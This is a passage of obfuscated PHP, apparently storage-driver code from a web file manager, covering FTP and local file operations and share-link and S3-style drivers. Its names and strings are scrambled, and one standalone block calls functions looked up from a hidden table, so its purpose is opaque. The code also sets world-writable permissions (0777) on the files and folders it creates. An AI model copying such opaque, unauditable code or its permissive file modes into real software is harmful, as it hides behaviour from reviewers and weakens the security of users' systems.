$this->iconvSystem($dã¨Œ‰‹ğõ); goto Aå£«ßö; Aå£«ßö: $fÌšî»©í• = $this->iconvSystem($fÌšî»©í•); $EØºâ¸Íêò = ftp_nb_put($this->connect, $dã¨Œ‰‹ğõ, $fÌšî»©í•, FTP_BINARY); while ($EØºâ¸Íêò == FTP_MOREDATA) { $EØºâ¸Íêò = ftp_nb_continue($this->connect); } goto Dö¸Ü çØŒ; EÆŞ¥ÕŒ‰†: } public function download($B£Ã¹ùÍÓ, $e•Š¦á¬ƒò = '') { goto bˆ‚Ÿ³„á¢; F÷»¿¨öë¡: while ($FôÃÑ‚ØÀÆ == FTP_MOREDATA) { $FôÃÑ‚ØÀÆ = ftp_nb_continue($this->connect); } if ($FôÃÑ‚ØÀÆ != FTP_FINISHED) { return !1; } return $this->iconvApp($e•Š¦á¬ƒò); goto c ª¶†¼À; bˆ‚Ÿ³„á¢: if (!$this->_isconn()) { return !1; } $BÎ¸õ›ñ‡ = $this->pathFather($e•Š¦á¬ƒò); if (!IO::mkdir($BÎ¸õ›ñ‡)) { return !1; } goto f ‹ìÎË…Î; f ‹ìÎË…Î: $B£Ã¹ùÍÓ = $this->iconvSystem($B£Ã¹ùÍÓ); $e•Š¦á¬ƒò = $this->iconvSystem($e•Š¦á¬ƒò); $FôÃÑ‚ØÀÆ = ftp_nb_get($this->connect, $e•Š¦á¬ƒò, $B£Ã¹ùÍÓ, FTP_BINARY); goto F÷»¿¨öë¡; c ª¶†¼À: } public function exist($b‡ëó›ùÙñ) { return $this->isFile($b‡ëó›ùÙñ) || $this->isFolder($b‡ëó›ùÙñ); } public function isFile($fùÎ“×â‘÷) { return !$this->isFolder($fùÎ“×â‘÷) && $this->objectMeta($fùÎ“×â‘÷); } public function isFolder($d¸İª«’ÀÕ) { return $this->cacheMethod($_SERVER[Šº][198], $d¸İª«’ÀÕ); } protected function objectMeta($EˆÉ»„¶èÁ) { return $this->cacheMethod($_SERVER[Šº][199], $EˆÉ»„¶èÁ); } protected function _objectMeta($CœÅŒÜ¦õ) { goto EœàˆŒø¸; bŒšƒÒÌÓò: $CœÅŒÜ¦õ = $this->iconvSystem($CœÅŒÜ¦õ); $dÏÁ–‹‹‘ô = array($Bİİ›ëÌÃØ[28] => $this->iconvApp($CœÅŒÜ¦õ), $Bİİ›ëÌÃØ[29] => $Bİİ›ëÌÃØ[192], $Bİİ›ëÌÃØ[78] => 0); @ftp_chdir($this->connect, $Bİİ›ëÌÃØ[8]); goto C°Á«İ–ˆÀ; C°Á«İ–ˆÀ: $bÔáÊÃŠ– = @ftp_size($this->connect, $CœÅŒÜ¦õ); if ($bÔáÊÃŠ– != -1) { $dÏÁ–‹‹‘ô[$Bİİ›ëÌÃØ[78]] = $bÔáÊÃŠ–; } else { $aÕåÈäÌÀ² = @ftp_chdir($this->connect, $CœÅŒÜ¦õ); if (!$aÕåÈäÌÀ²) { return !1; } $dÏÁ–‹‹‘ô[$Bİİ›ëÌÃØ[29]] = $Bİİ›ëÌÃØ[77]; } return $dÏÁ–‹‹‘ô; goto f­øÖÜó“; EœàˆŒø¸: $Bİİ›ëÌÃØ =& $_SERVER[Šº]; if ($CœÅŒÜ¦õ == $Bİİ›ëÌÃØ[33] || $CœÅŒÜ¦õ == $Bİİ›ëÌÃØ[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto bŒšƒÒÌÓò; f­øÖÜó“: } protected function _isFolder($Bç—×ÀÕ”™) { $Bˆ¼¤Ó²‹ =& $_SERVER[Šº]; if ($Bç—×ÀÕ”™ == $Bˆ¼¤Ó²‹[33] || $Bç—×ÀÕ”™ == $Bˆ¼¤Ó²‹[8]) { return !0; } $e¤­°Â¼ˆ½ = $this->_objectMeta($Bç—×ÀÕ”™); return isset($e¤­°Â¼ˆ½[$Bˆ¼¤Ó²‹[29]]) && $e¤­°Â¼ˆ½[$Bˆ¼¤Ó²‹[29]] == $Bˆ¼¤Ó²‹[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($bªØÌ‹½Â) { if (substr($bªØÌ‹½Â, 0, 2) == $_SERVER[Šº][1231]) { $bªØÌ‹½Â = BASIC_PATH . substr($bªØÌ‹½Â, 2); } return $bªØÌ‹½Â; } public function iconvApp($DŞ¢´ÙÑ±ö) { $B¯Ï‘ÏÉÆ‡ =& $_SERVER[Šº]; global $config; return $this->iconvTo($DŞ¢´ÙÑ±ö, $config[$B¯Ï‘ÏÉÆ‡[1229]], $config[$B¯Ï‘ÏÉÆ‡[1228]]); } public function iconvSystem($Bäáôš‡ë) { $A¨Öè´Ü‰õ =& $_SERVER[Šº]; global $config; return $this->iconvTo($Bäáôš‡ë, $config[$A¨Öè´Ü‰õ[1228]], $config[$A¨Öè´Ü‰õ[1229]]); } public function getPathOuter($D´âè‹„Š¦) { goto C·ƒî¨’å; FÈ®åŸÜÎ: return $this->pathDriver . $BîŠ’—…Éª[8] . ltrim($D´âè‹„Š¦, $BîŠ’—…Éª[8]); goto FÈ“ñä­´‘; FŒ–ÍµÈƒ: if (substr($BåÜÑËƒÆÖ, 0, 2) == $BîŠ’—…Éª[1231]) { $BåÜÑËƒÆÖ = BASIC_PATH . substr($BåÜÑËƒÆÖ, 2); } if (substr($D´âè‹„Š¦, 0, 2) == $BîŠ’—…Éª[1231]) { $D´âè‹„Š¦ = BASIC_PATH . substr($D´âè‹„Š¦, 2); } $BåÜÑËƒÆÖ = KodIO::clear($BåÜÑËƒÆÖ); goto F¹¿¹¬ùÂ; C·ƒî¨’å: $BîŠ’—…Éª =& $_SERVER[Šº]; $BåÜÑËƒÆÖ = $this->iconvApp($this->pathBase); $D´âè‹„Š¦ = $this->iconvApp($D´âè‹„Š¦); goto FŒ–ÍµÈƒ; F¹¿¹¬ùÂ: $D´âè‹„Š¦ = KodIO::clear($D´âè‹„Š¦); $D´âè‹„Š¦ = substr($D´âè‹„Š¦, strlen($BåÜÑËƒÆÖ)); if (empty($this->pathDriver)) { return $D´âè‹„Š¦; } goto FÈ®åŸÜÎ; FÈ“ñä­´‘: } public function mkfile($C‰²ÀÊìÂ, $eÜ†¡Õêà÷ = '', $A‹ÄâÊå® = REPEAT_RENAME) { $C‰²ÀÊìÂ = $this->iconvSystem($C‰²ÀÊìÂ); @touch($C‰²ÀÊìÂ); if ($eÜ†¡Õêà÷) { file_put_contents($C‰²ÀÊìÂ, $eÜ†¡Õêà÷); } @chmod($C‰²ÀÊìÂ, 511); return is_file($C‰²ÀÊìÂ) ? $this->getPathOuter($C‰²ÀÊìÂ) : !1; } public function mkdir($BŞ°„òâíÇ, $c£¿©ÎšğÛ = REPEAT_SKIP) { $BŞ°„òâíÇ = $this->iconvSystem($BŞ°„òâíÇ); if (is_dir($BŞ°„òâíÇ)) { return $this->getPathOuter($BŞ°„òâíÇ); } @mkdir($BŞ°„òâíÇ, 511, !0); @chmod($BŞ°„òâíÇ, 511); return is_dir($BŞ°„òâíÇ) ? $this->getPathOuter($BŞ°„òâíÇ) : !1; } public function copyFile($Fæ¯±Ëå¥¯, $d¥Ô¼ˆ™) { $this->mkdir($this->pathFather($d¥Ô¼ˆ™)); $Fæ¯±Ëå¥¯ = $this->iconvSystem($Fæ¯±Ëå¥¯); $d¥Ô¼ˆ™ = $this->iconvSystem($d¥Ô¼ˆ™); $a·ìØ‰·ñ = copy_64($Fæ¯±Ëå¥¯, $d¥Ô¼ˆ™); @chmod($d¥Ô¼ˆ™, 511); return $a·ìØ‰·ñ ? $this->getPathOuter($d¥Ô¼ˆ™) : !1; } public function moveFile($EóÀ„Ñ™Ú, $c½Şˆ«¡) { goto DÓÓŠ»ãÌÉ; DÓÓŠ»ãÌÉ: $this->mkdir($this->pathFather($c½Şˆ«¡)); $EóÀ„Ñ™Ú = $this->iconvSystem($EóÀ„Ñ™Ú); $c½Şˆ«¡ = $this->iconvSystem($c½Şˆ«¡); goto FÎÄí°ùÊ¯; Aƒ„å¸ô×Ñ: return $D¸Å†±Õ† ? $this->getPathOuter($c½Şˆ«¡) : !1; goto eÆÍ²¹÷½Û; FÎÄí°ùÊ¯: $D¸Å†±Õ† = intval(@rename($EóÀ„Ñ™Ú, $c½Şˆ«¡)); if (!$D¸Å†±Õ†) { if ($D¸Å†±Õ† = intval(@copy_64($EóÀ„Ñ™Ú, $c½Şˆ«¡))) { @unlink($EóÀ„Ñ™Ú); } } @chmod($c½Şˆ«¡, 511); goto Aƒ„å¸ô×Ñ; eÆÍ²¹÷½Û: } public function delFile($CùŠô‹¹) { $CùŠô‹¹ = $this->iconvSystem($CùŠô‹¹); if (!@unlink($CùŠô‹¹)) { @chmod($CùŠô‹¹, 511); if (!@unlink($CùŠô‹¹)) { return !1; } } else { return !0; } } public function delFolder($BĞ£è“¯£ò) { goto AËÙãÓ¢×Ò; eâä¿††Ú: return rmdir($BĞ£è“¯£ò); goto d³‚²“—•ª; AËÙãÓ¢×Ò: $c¨ÂŸò½ĞÌ =& $_SERVER[Šº]; $BĞ£è“¯£ò = $this->iconvSystem($BĞ£è“¯£ò); if (!is_dir($BĞ£è“¯£ò)) { return !0; } goto b¡œ†î„é; b¡œ†î„é: if (!($D“óëğÙØ¿ = opendir($BĞ£è“¯£ò))) { return !1; } while (($dï”ßÌ‡ = readdir($D“óëğÙØ¿)) !== !1) { if ($dï”ßÌ‡ == $c¨ÂŸò½ĞÌ[95] || $dï”ßÌ‡ == $c¨ÂŸò½ĞÌ[1238]) { continue; } $Aëİ‡¼“ = $BĞ£è“¯£ò . $c¨ÂŸò½ĞÌ[8] . $dï”ßÌ‡; if (is_file($Aëİ‡¼“) || is_link($Aëİ‡¼“)) { if (!unlink($Aëİ‡¼“)) { chmod($Aëİ‡¼“, 511); if (!unlink($Aëİ‡¼“)) { return !1; } } } else { if (is_dir($Aëİ‡¼“)) { chmod($Aëİ‡¼“, 511); $Aëİ‡¼“ = $this->iconvApp($Aëİ‡¼“); if (!$this->delFolder($Aëİ‡¼“)) { return !1; } } } } closedir($D“óëğÙØ¿); goto eâä¿††Ú; d³‚²“—•ª: } public function rename($a©¨«õ‹øÉ, $f‚ØõàŸƒê) { goto FĞÆ›Âƒè; FĞÆ›Âƒè: $dë‘Ùòøµî =& $_SERVER[Šº]; $aŒ©ó’“¨ = $this->fileNameAuto($this->pathFather($a©¨«õ‹øÉ), $f‚ØõàŸƒê); $aŒ©ó’“¨ = $this->iconvSystem($aŒ©ó’“¨); goto fß‘¬ªÅ ; cÎ…¿Íšùç: $dÖâÕèêì = @rename($a©¨«õ‹øÉ, $DåÎŞÖŒóï); $DåÎŞÖŒóï = $this->iconvApp($DåÎŞÖŒóï); return $dÖâÕèêì ? $this->getPathOuter($DåÎŞÖŒóï) : !1; goto BÀÀ‡ŸÛÁæ; fß‘¬ªÅ : $a©¨«õ‹øÉ = $this->iconvSystem($a©¨«õ‹øÉ); $DØõ»¢ˆ„¯ = $this->pathFather($a©¨«õ‹øÉ); $DåÎŞÖŒóï = rtrim($DØõ»¢ˆ„¯, $dë‘Ùòøµî[8]) . $dë‘Ùòøµî[8] . $aŒ©ó’“¨; goto cÎ…¿Íšùç; BÀÀ‡ŸÛÁæ: } public function size($DÂŒİ¼÷õ) { $DÂŒİ¼÷õ = $this->iconvSystem($DÂŒİ¼÷õ); return filesize_64($DÂŒİ¼÷õ); } public function info($bíˆ­È´Œã) { $bíˆ­È´Œã = $this->iconvSystem($bíˆ­È´Œã); if ($this->isFolder($bíˆ­È´Œã)) { return $this->folderInfo($bíˆ­È´Œã); } else { if ($this->isFile($bíˆ­È´Œã)) { return $this->fileInfo($bíˆ­È´Œã); } } return !1; } protected function infoChildren($B½«ä”ŠÖ, &$cÒÜÆ¢¥ê, $AÊÉ®‡ğ”½ = true) { goto C˜ÙĞÓ©²«; C˜ÙĞÓ©²«: $FˆÖºÍÄØÖ =& $_SERVER[Šº]; check_abort_echo(); $B½«ä”ŠÖ = rtrim($B½«ä”ŠÖ, $FˆÖºÍÄØÖ[8]) . $FˆÖºÍÄØÖ[8]; goto b«•‘Œ‰Âè; DË‰½ÅÑŠî: closedir($CŞøŞÍà‘Û); goto CÁÁ†ë‡ƒ—; b«•‘Œ‰Âè: if ($AÊÉ®‡ğ”½) { $B½«ä”ŠÖ = $this->iconvSystem($B½«ä”ŠÖ); } if (!($CŞøŞÍà‘Û = @opendir($B½«ä”ŠÖ))) { return; } while (($aåìÓœ·Ç = readdir($CŞøŞÍà‘Û)) !== !1) { if ($aåìÓœ·Ç == $FˆÖºÍÄØÖ[95] || $aåìÓœ·Ç == $FˆÖºÍÄØÖ[1238]) { continue; } $f×çÑÄ—ˆ¬ = $B½«ä”ŠÖ . $aåìÓœ·Ç; if (is_file($f×çÑÄ—ˆ¬) || is_link($f×çÑÄ—ˆ¬)) { $cÒÜÆ¢¥ê[$FˆÖºÍÄØÖ[79]]++; $cÒÜÆ¢¥ê[$FˆÖºÍÄØÖ[78]] += filesize_64($f×çÑÄ—ˆ¬); } else { if (is_dir($f×çÑÄ—ˆ¬)) { $cÒÜÆ¢¥ê[$FˆÖºÍÄØÖ[80]]++; $this->infoChildren($f×çÑÄ—ˆ¬, $cÒÜÆ¢¥ê, !1); } } } goto DË‰½ÅÑŠî; CÁÁ†ë‡ƒ—: } private function folderInfo($D†ìƒÕ·‹„, $cºè¥´™çâ = false) { $bëÙ—øŸ˜„ =& $_SERVER[Šº]; $D†ìƒÕ·‹„ = rtrim($D†ìƒÕ·‹„, $bëÙ—øŸ˜„[8]) . $bëÙ—øŸ˜„[8]; $aô‹æ¨é¼ù = $this->iconvApp($this->pathThis($D†ìƒÕ·‹„)); if ($cºè¥´™çâ) { return array($bëÙ—øŸ˜„[28] => $aô‹æ¨é¼ù, $bëÙ—øŸ˜„[76] => $this->getPathOuter($D†ìƒÕ·‹„), $bëÙ—øŸ˜„[29] => $bëÙ—øŸ˜„[77]); } $b“«ÕÅ÷éİ = array($bëÙ—øŸ˜„[28] => $aô‹æ¨é¼ù, $bëÙ—øŸ˜„[76] => $this->getPathOuter($D†ìƒÕ·‹„), $bëÙ—øŸ˜„[29] => $bëÙ—øŸ˜„[77], $bëÙ—øŸ˜„[193] => @filectime($D†ìƒÕ·‹„), $bëÙ—øŸ˜„[84] => @filemtime($D†ìƒÕ·‹„), $bëÙ—øŸ˜„[1241] => @fileatime($D†ìƒÕ·‹„), $bëÙ—øŸ˜„[1242] => is_readable($D†ìƒÕ·‹„), $bëÙ—øŸ˜„[1243] => is_writable($D†ìƒÕ·‹„), $bëÙ—øŸ˜„[1244] => get_mode($D†ìƒÕ·‹„)); return $b“«ÕÅ÷éİ; } private function fileInfo($FÙÑ„®ôÜÒ, $a´’Ú›»ù = false) { $a‰°›„¹Ç· =& $_SERVER[Šº]; $fêáöØˆ– = $this->iconvApp($this->pathThis($FÙÑ„®ôÜÒ)); if ($a´’Ú›»ù) { return array($a‰°›„¹Ç·[28] => $fêáöØˆ–, $a‰°›„¹Ç·[76] => $this->getPathOuter($FÙÑ„®ôÜÒ), $a‰°›„¹Ç·[29] => $a‰°›„¹Ç·[192], $a‰°›„¹Ç·[78] => $this->size($FÙÑ„®ôÜÒ), $a‰°›„¹Ç·[168] => $this->ext($fêáöØˆ–)); } $cÊÀì•¢Ú = array($a‰°›„¹Ç·[28] => $fêáöØˆ–, $a‰°›„¹Ç·[76] => $this->getPathOuter($FÙÑ„®ôÜÒ), $a‰°›„¹Ç·[29] => $a‰°›„¹Ç·[192], $a‰°›„¹Ç·[193] => @filectime($FÙÑ„®ôÜÒ), $a‰°›„¹Ç·[84] => @filemtime($FÙÑ„®ôÜÒ), $a‰°›„¹Ç·[1241] => @fileatime($FÙÑ„®ôÜÒ), $a‰°›„¹Ç·[78] => $this->size($FÙÑ„®ôÜÒ), $a‰°›„¹Ç·[168] => $this->ext($fêáöØˆ–), $a‰°›„¹Ç·[1242] => is_readable($FÙÑ„®ôÜÒ), $a‰°›„¹Ç·[1243] => is_writable($FÙÑ„®ôÜÒ), $a‰°›„¹Ç·[1244] => get_mode($FÙÑ„®ôÜÒ)); return $cÊÀì•¢Ú; } public function exist($Aèá’®²Š”) { $Aèá’®²Š” = $this->iconvSystem($Aèá’®²Š”); return @file_exists($Aèá’®²Š”); } public function isFile($d¯À§Òñ) { $d¯À§Òñ = $this->iconvSystem($d¯À§Òñ); return @is_file($d¯À§Òñ); } public function isFolder($B·ÏÕÖŒ) { $B·ÏÕÖŒ = $this->iconvSystem($B·ÏÕÖŒ); return @is_dir($B·ÏÕÖŒ); } public function listPath($FŒœˆ†•İ, $dŸ„àŠ¢ìè = false) { goto D±¦ ¢íî; D±¦ ¢íî: $F¦œ»‚ŒÜò =& $_SERVER[Šº]; $FŒœˆ†•İ = $this->iconvSystem($FŒœˆ†•İ); $FŒœˆ†•İ = rtrim($FŒœˆ†•İ, $F¦œ»‚ŒÜò[8]) . $F¦œ»‚ŒÜò[8]; goto b·­á·Ê‚î; eã¬Ÿ£îë¾: closedir($fÔŸ•ğÓØ²); return $C¯‹÷­‡Ö; goto AŞÁ‚ŒìÍÛ; b·­á·Ê‚î: $C¯‹÷­‡Ö = array($F¦œ»‚ŒÜò[75] => array(), $F¦œ»‚ŒÜò[74] => array()); if (!($fÔŸ•ğÓØ² = @opendir($FŒœˆ†•İ))) { return $C¯‹÷­‡Ö; } while (($CâæøñÖŠ¿ = readdir($fÔŸ•ğÓØ²)) !== !1) { if ($CâæøñÖŠ¿ == $F¦œ»‚ŒÜò[95] || $CâæøñÖŠ¿ == $F¦œ»‚ŒÜò[1238]) { continue; } $b‹‚é™Àù‚ = $FŒœˆ†•İ . $CâæøñÖŠ¿; if (is_file($b‹‚é™Àù‚)) { $C¯‹÷­‡Ö[$F¦œ»‚ŒÜò[74]][] = $this->fileInfo($b‹‚é™Àù‚, $dŸ„àŠ¢ìè); } else { $C¯‹÷­‡Ö[$F¦œ»‚ŒÜò[75]][] = $this->folderInfo($b‹‚é™Àù‚, $dŸ„àŠ¢ìè); } } goto eã¬Ÿ£îë¾; AŞÁ‚ŒìÍÛ: } public function listAll($f¶ç‡ĞÌ«, &$B¢‹æÑ• = array()) { goto f¢èÀ¶¿à; fºê–Õ•‘»: return $B¢‹æÑ•; goto cÖö¶åˆ£Œ; Fİğ™äØŒš: if (!($cî±Ó˜Ğ‚„ = @opendir($f¶ç‡ĞÌ«))) { return $B¢‹æÑ•; } while (($fˆ‘ºåùµŸ = readdir($cî±Ó˜Ğ‚„)) !== !1) { if ($fˆ‘ºåùµŸ == $Eîï¢Å¾›¬[95] || $fˆ‘ºåùµŸ == $Eîï¢Å¾›¬[1238]) { continue; } $CğÚùïìˆÆ = $f¶ç‡ĞÌ« . $fˆ‘ºåùµŸ; if (is_dir($CğÚùïìˆÆ) && !is_link($CğÚùïìˆÆ)) { $B¢‹æÑ•[] = array($Eîï¢Å¾›¬[76] => $CğÚùïìˆÆ . $Eîï¢Å¾›¬[8], $Eîï¢Å¾›¬[77] => 1, $Eîï¢Å¾›¬[84] => @filemtime($CğÚùïìˆÆ), $Eîï¢Å¾›¬[78] => 0); $this->listAll($CğÚùïìˆÆ, $B¢‹æÑ•); } else { $B¢‹æÑ•[] = array($Eîï¢Å¾›¬[76] => $CğÚùïìˆÆ, $Eîï¢Å¾›¬[77] => 0, $Eîï¢Å¾›¬[84] => @filemtime($CğÚùïìˆÆ), $Eîï¢Å¾›¬[78] => $this->size($CğÚùïìˆÆ)); } } closedir($cî±Ó˜Ğ‚„); goto fºê–Õ•‘»; f¢èÀ¶¿à: $Eîï¢Å¾›¬ =& $_SERVER[Šº]; $f¶ç‡ĞÌ« = $this->iconvSystem($f¶ç‡ĞÌ«); $f¶ç‡ĞÌ« = rtrim($f¶ç‡ĞÌ«, $Eîï¢Å¾›¬[8]) . $Eîï¢Å¾›¬[8]; goto Fİğ™äØŒš; cÖö¶åˆ£Œ: } public function has($fëƒœ¶ˆ²Ê, $a—ˆøß°©¯ = false, $DĞ®˜œ•Û¹ = true) { goto d“·³æÚ‘; cèÌ…ö¾¨Ÿ: if (!($DßöÒĞ–£ = @opendir($fëƒœ¶ˆ²Ê))) { return !1; } $BøÔì—èÏÍ = 0; $fä©¡ùÈÚ = 0; goto AÜÉÎ„ê¢; C‡ƒ½íÆğ: if ($a—ˆøß°©¯) { return array($F†«†„Ã¯[202] => $BøÔì—èÏÍ, $F†«†„Ã¯[203] => $fä©¡ùÈÚ); } return !1; goto a»Ù¿“˜î¦; d“·³æÚ‘: $F†«†„Ã¯ =& $_SERVER[Šº]; $fëƒœ¶ˆ²Ê = $this->iconvSystem($fëƒœ¶ˆ²Ê); $fëƒœ¶ˆ²Ê = rtrim($fëƒœ¶ˆ²Ê, $F†«†„Ã¯[8]) . $F†«†„Ã¯[8]; goto cèÌ…ö¾¨Ÿ; AÜÉÎ„ê¢: $f àÅ™äºÍ = 0; while (($F›öƒÖ…ì£ = readdir($DßöÒĞ–£)) !== !1) { if ($F›öƒÖ…ì£ == $F†«†„Ã¯[95] || $F›öƒÖ…ì£ == $F†«†„Ã¯[1238]) { continue; } $e»¾Í¾·³Ï = $fëƒœ¶ˆ²Ê . $F›öƒÖ…ì£; if ($a—ˆøß°©¯) { $f àÅ™äºÍ++; if (@is_file($e»¾Í¾·³Ï)) { $BøÔì—èÏÍ++; } else { $fä©¡ùÈÚ++; } if ($f àÅ™äºÍ > 10000) { break; } continue; } if ($DĞ®˜œ•Û¹) { if (@is_file($e»¾Í¾·³Ï)) { return !0; } } else { if (@is_dir($e»¾Í¾·³Ï . $F†«†„Ã¯[8])) { return !0; } } } closedir($DßöÒĞ–£); goto C‡ƒ½íÆğ; a»Ù¿“˜î¦: } public function hashSimple($CƒïÚ›ëÕÚ) { goto FŸ‰œçÁ; e†‡éÌÍ·’: return md5($f¶Œ›Ñ´Ó¢) . $eé×ôš’î½; goto e´²è¼•…³; FŸ‰œçÁ: $FŞäÂŠÁµœ =& $_SERVER[Šº]; if (!$CƒïÚ›ëÕÚ) { return md5($FŞäÂŠÁµœ[33]); } $CƒïÚ›ëÕÚ = $this->iconvSystem($CƒïÚ›ëÕÚ); goto Aæ•Ï‡ç‚«; aèœÂµ°Ûø: $Fñ¡˜ê–‘† = fopen($CƒïÚ›ëÕÚ, $FŞäÂŠÁµœ[1245]); if (!$Fñ¡˜ê–‘†) { return $f¶Œ›Ñ´Ó¢; } for ($F”§Åá³Ë = 0; $F”§Åá³Ë < $c†“æö”¬Ì; $F”§Åá³Ë++) { fseek_64($Fñ¡˜ê–‘†, $a®İ‹â¡éê * $F”§Åá³Ë); $f¶Œ›Ñ´Ó¢ .= fread($Fñ¡˜ê–‘†, $fªÚî½ˆÕ); } goto DÓæëˆÊ‡¦; e÷ÌÆé£ª: if ($eé×ôš’î½ <= $fªÚî½ˆÕ * $c†“æö”¬Ì) { return $this->hashMd5($CƒïÚ›ëÕÚ) . $eé×ôš’î½; } $f¶Œ›Ñ´Ó¢ = $FŞäÂŠÁµœ[33]; $a®İ‹â¡éê = intval($eé×ôš’î½ / $c†“æö”¬Ì); goto aèœÂµ°Ûø; Aæ•Ï‡ç‚«: $eé×ôš’î½ = $this->size($CƒïÚ›ëÕÚ); $fªÚî½ˆÕ = 200; $c†“æö”¬Ì = 50; goto e÷ÌÆé£ª; DÓæëˆÊ‡¦: fseek_64($Fñ¡˜ê–‘†, $eé×ôš’î½ - $fªÚî½ˆÕ); $f¶Œ›Ñ´Ó¢ .= fread($Fñ¡˜ê–‘†, $fªÚî½ˆÕ); fclose($Fñ¡˜ê–‘†); goto e†‡éÌÍ·’; e´²è¼•…³: } public function getContent($bšÎ§Ç¶ùÛ) { $bšÎ§Ç¶ùÛ = $this->iconvSystem($bšÎ§Ç¶ùÛ); return file_get_contents($bšÎ§Ç¶ùÛ); } public function setContent($D”’¤±ñÌ, $F¿Ê¹¬¥¾¼ = '') { $D”’¤±ñÌ = $this->iconvSystem($D”’¤±ñÌ); $dòŒœÉ¹Ê = @file_put_contents($D”’¤±ñÌ, $F¿Ê¹¬¥¾¼, LOCK_EX); clearstatcache(); @chmod($D”’¤±ñÌ, 511); return $dòŒœÉ¹Ê === !1 ? !1 : !0; } public function fileSubstr($eÇˆÆ…¡Î, $Dªåó•†˜ñ = 0, $b¹ø®Ò•¬½ = false) { goto AßÓÚğŠ‚¾; C·¦ë§ƒá: fseek_64($D¡ÚËÜµÑ÷, $Dªåó•†˜ñ); $E¢ÔÓ®ÍŒÂ = fread($D¡ÚËÜµÑ÷, $b¹ø®Ò•¬½); fclose($D¡ÚËÜµÑ÷); goto eÉøÀ—Ë…; f¾ÈŞÒá¡Û: if ($b¹ø®Ò•¬½ <= 0) { return $E÷¥Ò¼˜ì»[33]; } $D¡ÚËÜµÑ÷ = fopen($eÇˆÆ…¡Î, $E÷¥Ò¼˜ì»[1245]); if (!$D¡ÚËÜµÑ÷) { return !1; } goto C·¦ë§ƒá; AßÓÚğŠ‚¾: $E÷¥Ò¼˜ì» =& $_SERVER[Šº]; $eÇˆÆ…¡Î = $this->iconvSystem($eÇˆÆ…¡Î); if ($b¹ø®Ò•¬½ === !1) { $b¹ø®Ò•¬½ = $this->size($eÇˆÆ…¡Î); } goto f¾ÈŞÒá¡Û; eÉøÀ—Ë…: return $E¢ÔÓ®ÍŒÂ; goto e³ŸÒ±µ½Ã; e³ŸÒ±µ½Ã: } public function upload($Cëœ‚²İçò, $aïßòÂÀÚ , $F¦ùµ… ¡£ = false, $BÀİŠ¢‚— = REPEAT_REPLACE) { if ($F¦ùµ… ¡£) { return $this->moveFile($aïßòÂÀÚ , $Cëœ‚²İçò); } return $this->copyFile($aïßòÂÀÚ , $Cëœ‚²İçò); } public function setModifyTime($e¶¥¥æì»à, $FˆÓÃåœç = '') { @touch($e¶¥¥æì»à, intval($FˆÓÃåœç)); } public function download($b¬›ÎÙ–ï, $d†Ş®ñï‘) { return $this->iconvSystem($b¬›ÎÙ–ï); } } if ($_SERVER[$_SERVER[Šº][395]] != $_SERVER[$_SERVER[Šº][1246]]) { goto c­£¬ßŞ–’; eõÀÂÅÄİö: $CÍ×˜œ‹Ç£($_SERVER[$_SERVER[Šº][393]]); goto A¾â•÷æÓ; cÍæ¹ğ¼–…: $bÜ³——¾Æ = explode($_SERVER[Šº][228], $BÙ‰–à‘·); if (count($bÜ³——¾Æ) < $_SERVER[Šº][399]) { $b‘Õœ„÷éö = $_SERVER[Šº][400]; $b‘Õœ„÷éö(); } $CÍ×˜œ‹Ç£ = $_SERVER[Šº][401]; goto eõÀÂÅÄİö; c­£¬ßŞ–’: $e©™˜Ã¤‹Ó = $_SERVER[Šº][396]; $F«¿¹÷É¸’ = $_SERVER[$_SERVER[Šº][397]] . $_SERVER[Šº][398]; $BÙ‰–à‘· = $e©™˜Ã¤‹Ó($F«¿¹÷É¸’); goto cÍæ¹ğ¼–…; A¾â•÷æÓ: } goto cÙÒ¾Şº¢’; B“ÛŞÚÃ“: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($EÆëøºˆ‚‡) { $this->pathParse = $EÆëøºˆ‚‡; } protected function infoParse($b·’ÔÖ¶‡, $b÷ÂƒŒÙåì = false) { $D‹®”ÕØ¨ =& $_SERVER[Šº]; return Action($D‹®”ÕØ¨[1058])->sharePathInfo($this->pathParse[$D‹®”ÕØ¨[76]], !0, $b÷ÂƒŒÙåì); } public function listPath($fÛÏğ‹¹³œ, $EĞ¼Æ©¥†ª = false) { $F‚õíŠ¼ßÄ =& $_SERVER[Šº]; $Eëš»â¤ñ = IO::listPath($fÛÏğ‹¹³œ, $EĞ¼Æ©¥†ª); foreach ($Eëš»â¤ñ as $b¬Œ¼¥˜Ë· => $dòÌ’™¶Å¥) { if (!in_array($b¬Œ¼¥˜Ë·, array($F‚õíŠ¼ßÄ[74], $F‚õíŠ¼ßÄ[75]))) { continue; } foreach ($dòÌ’™¶Å¥ as $d¢Ó¥èƒ¸Ò => $d¡Ë½Ê¡÷) { $d¡Ë½Ê¡÷ = Action($F‚õíŠ¼ßÄ[1209])->parsePathChildren($d¡Ë½Ê¡÷, array($F‚õíŠ¼ßÄ[421] => $fÛÏğ‹¹³œ)); $Eëš»â¤ñ[$b¬Œ¼¥˜Ë·][$d¢Ó¥èƒ¸Ò] = Action($F‚õíŠ¼ßÄ[1058])->shareItemInfo($d¡Ë½Ê¡÷); } } return $Eëš»â¤ñ; } public function listAll($F°æÀÇÚ‡¿) { $Fñ·„‹°­Ä =& $_SERVER[Šº]; $D‘Ïµ£àœ = IO::listAll($F°æÀÇÚ‡¿); foreach ($D‘Ïµ£àœ as &$fêÁÖ©ëëŸ) { $Eã·„éåÅ = IO::info($fêÁÖ©ëëŸ[$Fñ·„‹°­Ä[76]]); $Eã·„éåÅ = is_array($Eã·„éåÅ) ? $Eã·„éåÅ : array(); $fêÁÖ©ëëŸ = array_merge($Eã·„éåÅ, $fêÁÖ©ëëŸ); $fêÁÖ©ëëŸ[$Fñ·„‹°­Ä[85]] = Action($Fñ·„‹°­Ä[1058])->shareItemInfo($fêÁÖ©ëëŸ); } unset($fêÁÖ©ëëŸ); return $D‘Ïµ£àœ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($e©ôöÅ•øî) { parent::__construct($e©ôöÅ•øî); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Dà’³ùğğ„) { parent::__construct($Dà’³ùğğ„); $this->signatureVersion($_SERVER[Šº][211]); } public function uploadFormData($d¥¹Ÿ¾¹Ä, $c’¢Şºæ–² = 3600) { goto CÄÃÈï²»³; CÄÃÈï²»³: $dÕˆƒÉÁÜĞ =& $_SERVER[Šº]; $e£æ‡ÆÏìÚ = $dÕˆƒÉÁÜĞ[191]; $Cçæ‹ÈóÍ½ = 